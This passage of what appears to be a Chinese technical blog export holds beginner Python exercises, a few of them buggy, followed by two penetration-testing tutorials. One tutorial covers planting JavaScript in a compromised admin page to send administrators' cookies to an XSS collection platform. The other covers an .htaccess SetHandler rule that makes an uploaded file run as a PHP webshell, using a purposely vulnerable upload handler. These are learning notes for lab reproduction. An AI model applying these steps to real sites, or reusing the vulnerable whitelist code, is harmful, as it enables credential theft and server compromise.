<h4 id="二分搜索"><a href="#二分搜索" class="headerlink" title="二分搜索"></a>二分搜索</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 二分搜索</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(arr,x)</span>:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Arrlength = len(arr)</span><br><span class="line"></span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = Arrlength</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'\nList长度：'</span>,Arrlength, <span class="string">'\nList头索引：'</span>,left, <span class="string">'\nList尾索引：'</span>,right, <span class="string">'\n[+] Starting Binary search......'</span></span><br><span class="line">    <span class="keyword">while</span> left&lt;=right:</span><br><span class="line"></span><br><span class="line">        mid = int((left + right) / <span class="number">2</span>)  <span class="comment"># 求中点如果写成 (left + right)/2 容易溢出</span></span><br><span class="line">        <span class="comment"># 当 X 出现的位置是否在mid</span></span><br><span class="line">        <span class="keyword">if</span> arr[mid] == x:</span><br><span class="line">           <span class="keyword">print</span> <span class="string">'[-] Searching complete ，the number Located in the &#123;&#125; index'</span>.format(mid + <span class="number">1</span>)</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 当 X 出现在mid右边</span></span><br><span class="line">        <span class="keyword">elif</span> arr[mid] &lt; x:</span><br><span class="line">            left = mid + <span class="number">1</span> <span class="comment"># 此时区间变为 [ mid+1 : right]</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] Search interval decreases[&#123;&#125;:&#123;&#125;]'</span>.format(mid+<span class="number">1</span>,right)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 当 X 出现在mid左边</span></span><br><span class="line">        <span class="keyword">elif</span> arr[mid] &gt; x:</span><br><span class="line">            right = mid - <span class="number">1</span>  <span class="comment"># 此时区间变为[ left : mid-1 ]</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] Search interval decreases[&#123;&#125;:&#123;&#125;]'</span>.format(left,mid<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[-] End Search!'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    arr1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">        arr1.append(input(<span class="string">'请输入第&#123;&#125;个数 构成一个包含10个数字的List：'</span>.format(i+<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'List为：'</span>,arr1</span><br><span class="line">    num1 = input(<span class="string">'请输入List中的数字 ，查找该数'</span>)</span><br><span class="line">    main(arr1,num1)</span><br></pre></td></tr></table></figure>

<h4 id="乘法口诀表"><a href="#乘法口诀表" class="headerlink" title="乘法口诀表"></a>乘法口诀表</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 乘法口诀表</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,i+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">'&#123;&#125; * &#123;&#125; = &#123;&#125;'</span>.format(j,i,j*i),end=<span class="string">'\t'</span>)</span><br><span class="line"></span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h4 id="输出fibonacci数列前n项"><a href="#输出fibonacci数列前n项" class="headerlink" title="输出fibonacci数列前n项"></a>输出fibonacci数列前n项</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 输出fibonacci（斐波那契）数列前 n 项</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">1</span>]</span><br><span class="line">    fib = [<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> len(fib) &lt; n:</span><br><span class="line">        fib.append(fib[len(fib)<span class="number">-1</span>]+fib[len(fib)<span class="number">-2</span>])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'[+] Waiting .....'</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'[+] Result already\n'</span>,fib)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    n = int(input(<span class="string">'please input Top Num ：'</span>))</span><br><span class="line"></span><br><span class="line">    fibonacci(n)</span><br></pre></td></tr></table></figure>

<h4 id="检测List中是否有重复元素"><a href="#检测List中是否有重复元素" class="headerlink" title="检测List中是否有重复元素"></a>检测List中是否有重复元素</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 检查list中是否有重复元素  利用集合（set）是一个无序的不重复元素序列，让两者比较结果得出</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(list)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(list) == len(set(list)):</span><br><span class="line">        print(<span class="string">'无重复'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'有重复'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    n = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>]</span><br><span class="line">    n2 = [<span class="number">12</span>,<span class="number">4</span>,<span class="number">67</span>,<span class="number">12</span>,<span class="number">67</span>,<span class="number">34</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">45</span>,<span class="number">67</span>,<span class="number">4</span>,<span class="number">6</span>]</span><br><span class="line">    n3 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>]</span><br><span class="line">    main(n)  <span class="comment"># 有重复</span></span><br><span class="line">    main(n2) <span class="comment"># 有重复</span></span><br><span class="line">    main(n3) <span class="comment"># 无重复</span></span><br></pre></td></tr></table></figure>

<h4 id="过滤空值"><a href="#过滤空值" class="headerlink" title="过滤空值"></a>过滤空值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 过滤空值</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(lst)</span>:</span></span><br><span class="line"></span><br><span class="line">    print(list(filter(bool,lst)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    lst = [<span class="literal">None</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="string">''</span>,<span class="string">'ok'</span>,[],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],<span class="literal">False</span>]</span><br><span class="line"></span><br><span class="line">    main(lst) <span class="comment"># ['1', 'ok', [1, 2, 3]]</span></span><br></pre></td></tr></table></figure>

<h4 id="列表反转"><a href="#列表反转" class="headerlink" title="列表反转"></a>列表反转</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 列表反转</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(lst)</span>:</span></span><br><span class="line"></span><br><span class="line">    print(lst[::<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    lst1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line">    main(lst1)  <span class="comment"># [9.8.7.6.5.4.3.2.1]</span></span><br></pre></td></tr></table></figure>

<h4 id="合并字典"><a href="#合并字典" class="headerlink" title="合并字典"></a>合并字典</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 合并字典</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(dic1,dic2)</span>:</span></span><br><span class="line"></span><br><span class="line">    print(&#123;**dic1,**dic2&#125;) <span class="comment"># python3.5之后支持此方法一行实现合并字典</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    dic1 = &#123;<span class="string">'num1'</span>:<span class="number">1</span>,<span class="string">'num2'</span>:<span class="number">2</span>&#125;</span><br><span class="line">    dic2 = &#123;<span class="string">'num3'</span>:<span class="number">3</span>,<span class="string">'num4'</span>:<span class="number">4</span>&#125;</span><br><span class="line">    main(dic1,dic2)  <span class="comment"># &#123;'num1':1,'num2':2,'num3':3,'num4':4&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="返回字典中最大的前n个值"><a href="#返回字典中最大的前n个值" class="headerlink" title="返回字典中最大的前n个值"></a>返回字典中最大的前n个值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 返回字典中最大的前n个值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> heapq <span class="keyword">import</span> nlargest <span class="comment"># 这个函数可以帮助我们在某个集合中找出最大的N个元素,nsmallest()反之</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(n)</span>:</span></span><br><span class="line"></span><br><span class="line">    dic = &#123;<span class="string">'a'</span>:<span class="number">21</span>,<span class="string">'b'</span>:<span class="number">32</span>,<span class="string">'c'</span>:<span class="number">23</span>,<span class="string">'d'</span>:<span class="number">34</span>,<span class="string">'e'</span>:<span class="number">15</span>,<span class="string">'f'</span>:<span class="number">56</span>,<span class="string">'g'</span>:<span class="number">31</span>,<span class="string">'h'</span>:<span class="number">14</span>,<span class="string">'i'</span>:<span class="number">45</span>&#125;</span><br><span class="line">    print(nlargest(n,dic,key=<span class="keyword">lambda</span> k:dic[k]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    main(<span class="number">3</span>)  <span class="comment"># ['f','i','d'] 最大的前三个值</span></span><br></pre></td></tr></table></figure>

<h4 id="判断换位词"><a href="#判断换位词" class="headerlink" title="判断换位词"></a>判断换位词</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 判断换位词 单词的字母相同顺序不同即是换位词  如 true和ture</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter <span class="comment"># Counter目的是用来跟踪值出现的次数。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(a,b)</span>:</span></span><br><span class="line"></span><br><span class="line">    print(Counter(a) == Counter(b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    a = input(<span class="string">'输入第一个单词：\n'</span>)</span><br><span class="line">    b = input(<span class="string">'输入第二个单词：\n'</span>)</span><br><span class="line"></span><br><span class="line">    main(a,b)  <span class="comment"># True or False</span></span><br></pre></td></tr></table></figure>

<h4 id="返回列表中重复元素"><a href="#返回列表中重复元素" class="headerlink" title="返回列表中重复元素"></a>返回列表中重复元素</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 返回列表中重复的元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(lst)</span>:</span></span><br><span class="line"></span><br><span class="line">    c = Counter(lst)</span><br><span class="line">    print(list(filter(<span class="keyword">lambda</span> a:c[a]&gt;<span class="number">1</span>,c)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    lst = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">    find(lst)</span><br></pre></td></tr></table></figure>

<h4 id="返回指定格式的文件名"><a href="#返回指定格式的文件名" class="headerlink" title="返回指定格式的文件名"></a>返回指定格式的文件名</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 返回指定格式的文件名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_file</span><span class="params">(dir,extension=<span class="string">'jpg'</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">    list = []</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(dir): <span class="comment"># 遍历dir目录下的所有文件和目录名</span></span><br><span class="line"></span><br><span class="line">        splits = os.path.splitext(filename)  <span class="comment"># 分割路径，返回路径名和文件扩展名的元组 如('filename','.jpg')</span></span><br><span class="line">        ext = splits[<span class="number">1</span>] <span class="comment"># 获取扩展名</span></span><br><span class="line">        <span class="keyword">if</span> ext == <span class="string">'.'</span>+extension:</span><br><span class="line">            list.append(filename)</span><br><span class="line">            </span><br><span class="line">    print(<span class="string">'[-] 检索完毕，结果已得出'</span>)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> list:</span><br><span class="line">        print(name+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    dir = input(<span class="string">'请输入要搜索的文件路径'</span>)</span><br><span class="line">    ext = input(<span class="string">'请输入要搜索的文件类型'</span>)</span><br><span class="line">    <span class="comment"># find_file(r'E:\blog\source\_posts','md')</span></span><br><span class="line">    find_file(dir,ext)</span><br></pre></td></tr></table></figure>

<h4 id="判断素数"><a href="#判断素数" class="headerlink" title="判断素数"></a>判断素数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 判断素数 ，输出100-200之间的素数。只能被1和本身整除的叫素数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_num</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">200</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>,round(math.sqrt(i))+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> i%j == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    find_num()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ps:在python2中 a/b 的结果默认为int，在python3中 a/b 的结果默认为float ，要使python3中除的结果默认为int 可以使用 a//b</span></span><br></pre></td></tr></table></figure>

<h4 id="判断“水仙花数”"><a href="#判断“水仙花数”" class="headerlink" title="判断“水仙花数”"></a>判断“水仙花数”</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 判断水仙花数。一个三位数的值为每位数的3次方和，这个数就是水仙花数。如 153 = 1*1*1 + 5*5*5 + 3*3*3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_num</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">999</span>):</span><br><span class="line">        s = str(i)</span><br><span class="line">        num_1 = int(s[<span class="number">0</span>]) <span class="comment"># 百位</span></span><br><span class="line">        num_2 = int(s[<span class="number">1</span>]) <span class="comment"># 十位</span></span><br><span class="line">        num_3 = int(s[<span class="number">2</span>]) <span class="comment"># 个位</span></span><br><span class="line">        <span class="keyword">if</span> i == num_1**<span class="number">3</span> +num_2**<span class="number">3</span> +num_3**<span class="number">3</span>:</span><br><span class="line">            print(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    find_num()</span><br></pre></td></tr></table></figure>

<h4 id="输出日期"><a href="#输出日期" class="headerlink" title="输出日期"></a>输出日期</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 输出日期</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">date</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(datetime.date.today()) <span class="comment"># 输出今天日期</span></span><br><span class="line">    print(datetime.date(<span class="number">2333</span>,<span class="number">2</span>,<span class="number">3</span>)) <span class="comment"># 以日期形式输出 2333-02-03</span></span><br><span class="line">    print(datetime.date.today().strftime(<span class="string">'%d/%m/%y'</span>)) <span class="comment"># 以特定格式输出今天日期</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    date()</span><br></pre></td></tr></table></figure>

<h4 id="猴子偷桃"><a href="#猴子偷桃" class="headerlink" title="猴子偷桃"></a>猴子偷桃</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 猴子偷桃。猴子吃桃问题：猴子第一天摘下若干个桃子，当即吃了一半，还不瘾，又多吃了一个</span></span><br><span class="line"><span class="comment"># 第二天早上又将剩下的桃子吃掉一半，又多吃了一个。以后每天早上都吃了前一天剩下的一半零一个。</span></span><br><span class="line"><span class="comment"># 到第10天早上想再吃时，见只剩下一个桃子了。求第一天共摘了多少。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line"></span><br><span class="line">        j = (i+<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line">    print(j)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h4 id="判断回文"><a href="#判断回文" class="headerlink" title="判断回文"></a>判断回文</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 判断回文  12321</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(num)</span>:</span></span><br><span class="line"></span><br><span class="line">    list = str(num)</span><br><span class="line">    list2 = list[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> list == list2:</span><br><span class="line">        print(<span class="string">'True'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'False'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    num = input(<span class="string">'请输入一个数:'</span>)</span><br><span class="line">    main(num)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS利用JS获取Cookie维持权限</title>
    <url>/2020/01/26/XSS%E5%88%A9%E7%94%A8JS%E8%8E%B7%E5%8F%96Cookie%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>可以知道XSS是利用浏览器或者服务端加载JS达到目的，那么获取Webshell后，将JS插入到后端文件中，则每次加载都会自动执行插入的JS，以此可以获取最新cookie，达到维持权限的目的。</p>
<a id="more"></a>

<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>先在自己服务器上随便搭建了一个网站，百度找的源码。我将直接在服务器上写入一句话，获取Webshell。</p>
<p>观察一下这个网站的后台登录页面为/admin/cms_login.asp</p>
<img src="/2020/01/26/XSS利用JS获取Cookie维持权限/timg1.PNG">

<p>现在输入一个错误的用户名密码，url没有变化，弹窗提示消息</p>
<img src="/2020/01/26/XSS利用JS获取Cookie维持权限/timg2.PNG">

<p>输入正确的用户名密码进入后台，此时url变为/admin/cms_welcome.asp</p>
<img src="/2020/01/26/XSS利用JS获取Cookie维持权限/timg3.PNG">

<p>可以发现登录成功后，后台管理页面为cms_welcome.asp，每次管理员登录后台都一定会加载这个页面，如果已经获取了Webshell，那么在cms_welcome.asp 中加入JS 获取当前cookie并返回结果，每次管理员登录时都一定会加载插入的JS，就可以保持cookie的更新，从而维持权限。</p>
<p>对于返回cookie我们可以利用XSS平台模块获取信息。</p>
<img src="/2020/01/26/XSS利用JS获取Cookie维持权限/timg4.PNG">

<p>用蚁剑连接网站，找到cms_welcome.asp 并在其中加入JS</p>
<img src="/2020/01/26/XSS利用JS获取Cookie维持权限/timg5.PNG">

<p>现在模拟管理员登录后台，然后去XSS平台查看收到的cookie</p>
<img src="/2020/01/26/XSS利用JS获取Cookie维持权限/timg6.PNG">

<p>可以发现返回的cookie中带有adminpassword、adminname等关键信息</p>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>利用此方法维持权限访问需要满足几个条件</p>
<p>①已经获取Webshell ②有修改权限</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Web渗透</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>.htaccess文件上传漏洞利用</title>
    <url>/2020/01/20/htaccess%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。它是Apache服务器中的一个配置文件，负责相关目录下的网页配置。通过.htaccess文件，可以帮我们实现:网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<br>当网站允许上传或修改.htaccess文件时，我们就可以利用.htaccess文件中的一些规则，来达到我们的目的。</p>
<a id="more"></a>

<h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>该漏洞利用了Apache配置下的&lt;FileMatch&gt;指令和SetHandler 指令</p>
<p>以下是Apache官方文档中对两个指令的描述</p>
<blockquote>
<p>&lt;FilesMatch&gt; 指令<br>描述：    包含适用于正则表达式匹配文件名的指令<br>句法：    &lt;FilesMatch regex&gt; … &lt;/FilesMatch&gt;<br>内容：    服务器配置，虚拟主机，目录，.htaccess<br>覆写：    所有<br>状态：    核心<br>模组：    核心</p>
</blockquote>
<hr>
<blockquote>
<p>SetHandler 指令<br>描述：    强制所有匹配文件由处理程序处理<br>句法：    SetHandler handler-name|none|expression<br>内容：    服务器配置，虚拟主机，目录，.htaccess<br>覆写：    文件信息<br>状态：    核心<br>模组：    核心<br>兼容性：    表达式参数2.4.19及更高版本</p>
</blockquote>
<p>将两者结合起来时，我们可以得到以下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">//.htaccess</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;ggboom993&quot;&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/filesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>意为 将文件名中包含”ggboom993”这一字符串的所有文件，强制由php解析。</p>
<p>此时 如果名为”ggboom993”的文件中包含php一句话，那么在上传成功后，可以直接连菜刀获取shell。<br>实战中：<br>1、如果存在可以上传.htaccess文件，上传新文件添加解析规则<br>2、如果存在可以修改.htaccess文件，直接修改解析规则</p>
<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>先在服务器上写了一段简单的php文件上传代码,本地准备好.htaccess文件和html文件</p>
<p>upload.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;文件上传&lt;/title&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;center&gt;</span><br><span class="line">		&lt;!-- enctype=&quot;mulipart/form-data&quot;属性是指以二进制方式进行数据传输 </span><br><span class="line">		传输文件需要设置--&gt;</span><br><span class="line">		&lt;form action=&quot;upload_server.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;max_file_size&quot; value=&quot;1048576&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;submit&quot; name=&quot;上传&quot;&gt;		</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;/center&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>upload_server.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line"></span><br><span class="line">//设置时区</span><br><span class="line">	date_default_timezone_set(&apos;PRC&apos;);</span><br><span class="line"></span><br><span class="line">//获取文件名</span><br><span class="line">	$filename = $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line"></span><br><span class="line">//获取文件临时路径</span><br><span class="line">	$temp_name = $_FILES[&apos;file&apos;][&apos;tmp_name&apos;];</span><br><span class="line"></span><br><span class="line">//获取大小</span><br><span class="line">	$size = $_FILES[&apos;file&apos;][&apos;size&apos;];</span><br><span class="line"></span><br><span class="line">//获取文件上传码，0代表文件上传成功</span><br><span class="line">	$error = $_FILES[&apos;file&apos;][&apos;error&apos;];</span><br><span class="line"></span><br><span class="line">//判断文件大小是否超过设置的最大上传限制</span><br><span class="line">	if ($size &gt; 2*1024*1024)&#123;</span><br><span class="line">		//</span><br><span class="line">		echo &quot;&lt;script&gt;alert(&apos;文件大小超过2M大小&apos;);window.history.go(-1);&lt;/script&gt;&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">//phpinfo函数会以数组的形式返回关于文件路径的信息 </span><br><span class="line">//[dirname]:目录路径[basename]:文件名[extension]:文件后缀名[filename]:不包含后缀的文件名</span><br><span class="line"></span><br><span class="line">	$arr = pathinfo($filename);</span><br><span class="line"></span><br><span class="line">//获取文件的后缀名</span><br><span class="line">	$ext_suffix = $arr[&apos;extension&apos;];</span><br><span class="line"></span><br><span class="line">//设置允许上传文件的后缀</span><br><span class="line">	$allow_suffix = array(&apos;jpg&apos;,&apos;gif&apos;,&apos;jpeg&apos;,&apos;png&apos;,&apos;htaccess&apos;,&apos;html&apos;);</span><br><span class="line"></span><br><span class="line">//判断上传的文件是否在允许的范围内（后缀）==&gt;白名单判断</span><br><span class="line">	if(!in_array($ext_suffix, $allow_suffix))&#123;</span><br><span class="line">		//window.history.go(-1)表示返回上一页并刷新页面</span><br><span class="line">		echo &quot;&lt;script&gt;alert(&apos;上传的文件类型不符&apos;);window.history.go(-1);&lt;/script&gt;&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span 